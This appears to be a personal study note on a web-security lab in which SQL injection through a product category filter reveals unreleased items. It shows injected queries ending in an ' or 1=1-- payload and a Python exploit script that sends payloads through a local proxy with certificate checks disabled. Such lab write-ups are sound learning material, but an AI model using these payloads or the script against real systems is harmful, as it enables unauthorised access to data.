📅 **Date**: 18 February 25  
📂 **Category**: Web Security
🔒 **Topic**: SQL Injection
🏷️ Tags: #websecurity/sql-injection #websecurity 

---
![](../../06-Assets/sql_lab1.png)

SQL Injection - product, category, filter
-> `End Goal` display all products both release and unreleased.
```sql
SELECT * FROM products WHERE category = ''' AND released = 1

SELECT * FROM products WHERE category = ''' AND released = 1

SELECT * FROM products WHERE category = ''--' AND released = 1

SELECT * FROM products WHERE category = ''

SELECT * FROM products WHERE category = '' or 1=1--' AND released = 1

```

## automated script:
🔽Here is the script where I can automated things.
```python
import requests
import sys
import urllib3

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Proxies configuration
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def exploit_sqli(url, payload):
    uri = 'filter?category='
    full_url = url + uri + payload
    try:
        r = requests.get(full_url, verify=False, proxies=proxies)
        if "Cat Grin" in r.text:
            return True
        else:
            return False
    except requests.exceptions.RequestException as e:
        print(f"[-] An error occurred: {e}")
        return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()
    except IndexError:
        print(f"[-] Usage: {sys.argv[0]} <url> <payload>")
        print(f'[-] Example: {sys.argv[0]} www.example.com "1=1"')
        sys.exit(-1)

    if exploit_sqli(url, payload):
        print("[+] SQL injection successful!")
    else:
        print("[-] SQL injection unsuccessful!")
    